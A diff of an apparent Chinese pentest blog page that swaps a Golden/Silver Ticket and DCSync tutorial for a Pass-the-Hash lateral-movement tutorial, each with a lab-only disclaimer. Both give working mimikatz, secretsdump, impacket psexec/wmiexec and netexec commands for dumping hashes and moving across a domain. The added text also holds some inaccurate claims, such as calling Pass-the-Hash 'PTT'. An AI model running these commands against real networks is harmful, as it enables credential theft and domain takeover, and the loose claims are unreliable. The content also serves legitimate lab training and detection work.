@@ -1,84 +1,107 @@
-<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="在本地 AD 靶场理解并验证黄金票据、白银票据与 DC 同步（DCSync）的原理、影响、利用、检测、防御与修复。"><title>域渗透：黄金票据、白银票据与 DC 同步</title><link rel=canonical href=https://souljian.cn/p/751088045/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="域渗透：黄金票据、白银票据与 DC 同步"><meta property='og:description' content="在本地 AD 靶场理解并验证黄金票据、白银票据与 DC 同步（DCSync）的原理、影响、利用、检测、防御与修复。"><meta property='og:url' content='https://souljian.cn/p/751088045/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='域渗透'><meta property='article:tag' content='黄金票据'><meta property='article:tag' content='白银票据'><meta property='article:tag' content='DCSync'><meta property='article:tag' content='Kerberos'><meta property='article:published_time' content='2026-08-29T13:50:00+08:00'><meta property='article:modified_time' content='2026-08-29T13:50:00+08:00'><meta name=twitter:title content="域渗透：黄金票据、白银票据与 DC 同步"><meta name=twitter:description content="在本地 AD 靶场理解并验证黄金票据、白银票据与 DC 同步（DCSync）的原理、影响、利用、检测、防御与修复。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Pass-the-Hash 横向移动完整实战：原理、NT hash 获取、psexec/wmiexec 利用、凭据传递与检测防御。"><title>横向移动 Pass-the-Hash 实战（无需密码的域内横向）</title><link rel=canonical href=https://souljian.cn/p/751088045/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="横向移动 Pass-the-Hash 实战（无需密码的域内横向）"><meta property='og:description' content="Pass-the-Hash 横向移动完整实战：原理、NT hash 获取、psexec/wmiexec 利用、凭据传递与检测防御。"><meta property='og:url' content='https://souljian.cn/p/751088045/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Pass-the-Hash'><meta property='article:tag' content='横向移动'><meta property='article:tag' content='域渗透'><meta property='article:tag' content='NT hash'><meta property='article:tag' content='psexec'><meta property='article:published_time' content='2026-08-29T21:30:00+08:00'><meta property='article:modified_time' content='2026-08-30T09:00:00+08:00'><meta name=twitter:title content="横向移动 Pass-the-Hash 实战（无需密码的域内横向）"><meta name=twitter:description content="Pass-the-Hash 横向移动完整实战：原理、NT hash 获取、psexec/wmiexec 利用、凭据传递与检测防御。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
 <span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_d0e0f681fd935e1f.jpg width=300 height=303 class=site-logo loading=lazy alt=Avatar>
 </a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>SoulJian小站</a></h1><h2 class=site-description>人生所有的痛苦，皆来自于我执</h2></div></header><ol class=menu-social><li><a href=https://github.com/souljian03 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
 <span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
 <span>搜索</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一漏洞原理>一、漏洞原理</a></li><li><a href=#二影响与危害>二、影响与危害</a></li><li><a href=#三利用--复现>三、利用 / 复现</a><ol><li><a href=#第一步拿到权限与哈希>第一步：拿到权限与哈希</a></li><li><a href=#第二步生成黄金票据>第二步：生成黄金票据</a></li><li><a href=#第三步白银票据>第三步：白银票据</a></li><li><a href=#第四步dc-同步dcsync>第四步：DC 同步（DCSync）</a></li></ol></li><li><a href=#四检测>四、检测</a></li><li><a href=#五防御>五、防御</a></li><li><a href=#六修复>六、修复</a></li><li><a href=#七小结>七、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/>域渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088045/>域渗透：黄金票据、白银票据与 DC 同步</a></h2><h3 class=article-subtitle>在本地 AD 靶场理解并验证黄金票据、白银票据与 DC 同步（DCSync）的原理、影响、利用、检测、防御与修复。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published datetime=2026-08-29T13:50:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 1 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>票据伪造与 DC 同步只能在自建 AD 靶场进行。在真实域环境伪造票据、提取 krbtgt 哈希、同步域控凭据可能触犯法律。</p><h2 id=一漏洞原理>一、漏洞原理</h2><p>Kerberos 认证中，票据的可信性由密钥保证：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理>一、原理</a></li><li><a href=#二pass-the-hash-攻击链图>二、Pass-the-Hash 攻击链图</a></li><li><a href=#三影响与危害>三、影响与危害</a></li><li><a href=#四获取-nt-hash>四、获取 NT hash</a></li><li><a href=#五横向移动>五、横向移动</a><ol><li><a href=#方法1psexecsmb--pass-the-hash>方法1：psexec（SMB + Pass-the-Hash）</a></li><li><a href=#方法2wmiexec无需落地工具>方法2：wmiexec（无需落地工具）</a></li><li><a href=#方法3rdpwin10-1809-支持-pass-the-hash-直连>方法3：RDP（Win10 1809+ 支持 Pass-the-Hash 直连）</a></li><li><a href=#方法4netexec批量横向>方法4：netexec（批量横向）</a></li></ol></li><li><a href=#六操作步骤>六、操作步骤</a></li><li><a href=#七检测>七、检测</a></li><li><a href=#八防御>八、防御</a></li><li><a href=#九小结>九、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088045/>横向移动 Pass-the-Hash 实战（无需密码的域内横向）</a></h2><h3 class=article-subtitle>Pass-the-Hash 横向移动完整实战：原理、NT hash 获取、psexec/wmiexec 利用、凭据传递与检测防御。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-29T21:30:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>Pass-the-Hash 只用于授权靶场。对真实域模拟凭据可能触犯法律。</p><h2 id=一原理>一、原理</h2><p>NT hash（NTLM 密码哈希）是 Windows 认证的核心。域内同一用户的 NT hash 在所有机器上相同（由域控分发）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>TGT（黄金票据）：用 krbtgt 账号的哈希签发，可伪造任意用户
-</span></span><span class=line><span class=cl>服务票据（白银票据）：用服务账号哈希签发，可伪造对某服务的访问
-</span></span><span class=line><span class=cl>DCSync：拥有复制权限的账号可远程同步域控凭据哈希
-</span></span></code></pre></td></tr></table></div></div><p>核心：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>NT hash = 用 MD4 算法对明文密码加密后的 16 字节值
+</span></span><span class=line><span class=cl>认证时：客户端不传密码，传用 hash 加密的 challenge 响应
+</span></span><span class=line><span class=cl>→ 攻击者拿到 hash，可以模拟认证，无需知道明文密码
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>黄金票据 = 拿到 krbtgt 哈希 → 伪造任意用户 TGT
-</span></span><span class=line><span class=cl>白银票据 = 拿到服务账号哈希 → 伪造服务票据（不经过 KDC）
-</span></span><span class=line><span class=cl>DCSync = 有 Replicating 权限 → 直接同步域管哈希
-</span></span></code></pre></td></tr></table></div></div><h2 id=二影响与危害>二、影响与危害</h2><img src=/img/ad-attack-path.svg alt=域渗透攻击路径图><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>黄金票据：持久存在、域内任意访问，改密码也不一定失效（krbtgt 需两次）
-</span></span><span class=line><span class=cl>白银票据：无需 KDC，隐蔽，直打指定服务
-</span></span><span class=line><span class=cl>DCSync：直接拿到域管/其他账号哈希，一击致命
-</span></span></code></pre></td></tr></table></div></div><p>风险等级：<strong>严重</strong>，基本等于域失守。</p><h2 id=三利用--复现>三、利用 / 复现</h2><h3 id=第一步拿到权限与哈希>第一步：拿到权限与哈希</h3><p>在已控制的域内机器上，用 mimikatz 抓取凭据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>privilege::debug
-</span></span><span class=line><span class=cl>sekurlsa::logonpasswords
-</span></span><span class=line><span class=cl># 解释：privilege::debug 提调试权限；logonpasswords 抓内存中的哈希/明文
-</span></span></code></pre></td></tr></table></div></div><p>要伪造黄金票据，需要 <code>krbtgt</code> 的哈希 + 域的 SID。</p><h3 id=第二步生成黄金票据>第二步：生成黄金票据</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>kerberos::golden /user:administrator /domain:corp.local \
-</span></span><span class=line><span class=cl>  /sid:S-1-5-21-xxx /krbtgt:<span class=p>&lt;</span>krbtgt哈希<span class=p>&gt;</span> /ptt
-</span></span><span class=line><span class=cl># 解释：用 krbtgt 哈希伪造管理员 TGT，/ptt 直接注入当前会话
-</span></span></code></pre></td></tr></table></div></div><p><code>/ptt</code> 直接把票据注入当前会话，即可访问域内任意资源。</p><h3 id=第三步白银票据>第三步：白银票据</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>kerberos::golden /user:administrator /domain:corp.local \
-</span></span><span class=line><span class=cl>  /sid:S-1-5-21-xxx /target:dc.corp.local /service:cifs \
-</span></span><span class=line><span class=cl>  /rc4:<span class=p>&lt;</span>服务账号哈希<span class=p>&gt;</span> /ptt
-</span></span></code></pre></td></tr></table></div></div><h3 id=第四步dc-同步dcsync>第四步：DC 同步（DCSync）</h3><p>用具备复制权限的账号：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>lsadump::dcsync /domain:corp.local /user:krbtgt
-</span></span><span class=line><span class=cl>lsadump::dcsync /domain:corp.local /all
-</span></span><span class=line><span class=cl># 解释：DCSync 通过复制协议远程拉取目标账号哈希，无需登录目标机器
-</span></span></code></pre></td></tr></table></div></div><p>即可远程拿到目标账号哈希，进而制作黄金票据或直接登录。</p><h2 id=四检测>四、检测</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击者获取 NT hash → 用 hash 模拟认证 → 通过 SMB/WMI/RDP 横向到同域其他主机
+</span></span><span class=line><span class=cl>这就是 Pass-the-Hash（PTT）
+</span></span></code></pre></td></tr></table></div></div><h2 id=二pass-the-hash-攻击链图>二、Pass-the-Hash 攻击链图</h2><img src=/img/pass-the-hash-chain.svg alt="Pass-the-Hash 横向移动攻击链"><h2 id=三影响与危害>三、影响与危害</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>异常 TGT：不存在的用户、无 KDC 请求的票据使用
-</span></span><span class=line><span class=cl>4624/4629 登录事件中票据信息异常
-</span></span><span class=line><span class=cl>大量 DCSync 特征的复制请求（事件 4662）
-</span></span><span class=line><span class=cl>黄金票据：krbtgt 哈希被异常使用（改密两次后才失效）
-</span></span></code></pre></td></tr></table></div></div><h2 id=五防御>五、防御</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>• 获取一台主机的 NT hash = 获取同域所有主机访问权限
+</span></span><span class=line><span class=cl>• 无需明文密码，无法被密码策略保护
+</span></span><span class=line><span class=cl>• 横向移动速度极快
+</span></span><span class=line><span class=cl>• 不会触发&#34;密码错误&#34;类告警
+</span></span></code></pre></td></tr></table></div></div><h2 id=四获取-nt-hash>四、获取 NT hash</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>限制具有复制权限的账号，最小化 DCSync 面
-</span></span><span class=line><span class=cl>特权账号监控 + 不在普通机器登录
-</span></span><span class=line><span class=cl>启用 Kerberos 与复制相关审计（4662、4769 等）
-</span></span><span class=line><span class=cl>实现 RODC / 增强密钥策略
-</span></span></code></pre></td></tr></table></div></div><h2 id=六修复>六、修复</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>方法1：mimikatz（从内存中提取）
+</span></span><span class=line><span class=cl>  mimikatz # sekurlsa::logonpasswords
+</span></span><span class=line><span class=cl>  → 输出域用户明文密码和 NT hash
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>方法2：secretsdump.py（从注册表/安全数据库提取）
+</span></span><span class=line><span class=cl>  secretsdump.py 域/管理员:密码@目标IP -just-dc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>方法3：hashdump（Linux 提权后）
+</span></span><span class=line><span class=cl>  hashdump
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>示例输出：
+</span></span><span class=line><span class=cl>域管理员:admin:F49E1C21DF5E15F5D10B0C145B477C90:2D734D10...
+</span></span></code></pre></td></tr></table></div></div><h2 id=五横向移动>五、横向移动</h2><h3 id=方法1psexecsmb--pass-the-hash>方法1：psexec（SMB + Pass-the-Hash）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>怀疑黄金票据：连续两次重置 krbtgt 密码（让旧票据失效）
-</span></span><span class=line><span class=cl>清理被植入的票据与后门
-</span></span><span class=line><span class=cl>下线/重置被泄露的特权账号
-</span></span><span class=line><span class=cl>全局排查并复测：旧票据不再可用
-</span></span></code></pre></td></tr></table></div></div><h2 id=七小结>七、小结</h2><p>黄金/白银票据与 DCSync 的共同点是“拿到密钥/权限就能绕过正常认证”。域渗透到最后往往就落在这几招上；防守核心是保护 krbtgt、限制复制权限、监控票据与复制事件。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/>域渗透</a>
-<a href=/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/>黄金票据</a>
-<a href=/tags/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/>白银票据</a>
-<a href=/tags/dcsync/>DCSync</a>
-<a href=/tags/kerberos/>Kerberos</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088069/><div class=article-details><h2 class=article-title>域渗透：BloodHound 域关系分析</h2></div></a></article><article><a href=/p/751088039/><div class=article-details><h2 class=article-title>域渗透：Kerberoasting 与 AS-REP Roasting 实战</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Linux</span>
+</span></span><span class=line><span class=cl>impacket-psexec 域/用户名@目标IP -hashes :F49E1C21DF5E15F5D10B0C145B477C90
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Windows（mimikatz）</span>
+</span></span><span class=line><span class=cl>privilege::debug
+</span></span><span class=line><span class=cl>sekurlsa::pth /user:域管理员 /domain:域 /ntlm:F49E1C21DF5E15F5D10B0C145B477C90
+</span></span><span class=line><span class=cl><span class=c1># 此时当前进程已用该 hash 认证，可以用 cmd/net use 横向</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=方法2wmiexec无需落地工具>方法2：wmiexec（无需落地工具）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-wmiexec 域/用户名@目标IP -hashes :F49E1C21DF5E15F5D10B0C145B477C90
+</span></span></code></pre></td></tr></table></div></div><h3 id=方法3rdpwin10-1809-支持-pass-the-hash-直连>方法3：RDP（Win10 1809+ 支持 Pass-the-Hash 直连）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>用 mimikatz PTH 后，直接 mstsc 远程桌面
+</span></span></code></pre></td></tr></table></div></div><h3 id=方法4netexec批量横向>方法4：netexec（批量横向）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb 10.0.0.0/24 -u 域管理员 -H F49E1C21DF5E15F5D10B0C145B477C90
+</span></span><span class=line><span class=cl><span class=c1># 批量用 hash 扫内网，自动横向</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=六操作步骤>六、操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：获取目标用户的 NT hash
+</span></span><span class=line><span class=cl>第 2 步：确认目标用户有管理员权限（domain admin / local admin）
+</span></span><span class=line><span class=cl>第 3 步：选工具（psexec/wmiexec/edr）用 hash 认证横向
+</span></span><span class=line><span class=cl>第 4 步：确认获得 shell 后继续信息收集
+</span></span><span class=line><span class=cl>第 5 步：用同一 hash 继续打同域其他主机
+</span></span></code></pre></td></tr></table></div></div><h2 id=七检测>七、检测</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
